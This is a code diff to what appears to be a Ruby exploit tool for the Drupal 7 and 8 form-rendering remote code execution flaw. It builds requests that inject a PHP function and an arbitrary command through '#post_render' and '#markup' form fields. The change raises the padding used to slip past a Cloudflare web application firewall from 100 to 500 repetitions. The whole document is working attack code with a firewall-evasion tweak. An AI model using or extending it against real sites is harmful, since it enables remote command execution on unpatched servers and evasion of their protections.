@@ -145,7 +145,7 @@ class Drupal8 < Target
     # Make the request
     params = 'element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax'
     if @cf_bypass
-      params = 'a=&'*100 + params
+      params = 'a=&'*500 + params
     end
 
     post_path = "#{@uri.path}#{@form_path}/?#{params}"
@@ -156,7 +156,7 @@ class Drupal8 < Target
                 @php_method + "&mail[a][#type]=markup&mail[a][#markup]=" + @command
 
     if @cf_bypass
-      req.body = 'a=&'*100 + req.body
+      req.body = 'a=&'*500 + req.body
     end
 
     puts info("POST: #{req.body}")
@@ -184,7 +184,7 @@ class Drupal7 < Target
     payload = URI.encode("name[#post_render][]=#{@php_method}&name[#markup]=#{@command}&name[#type]=markup")
 
     if @cf_bypass
-      payload = "a=&"*100 + payload
+      payload = "a=&"*500 + payload
     end
     
     if @form_path.include? 'user/password'
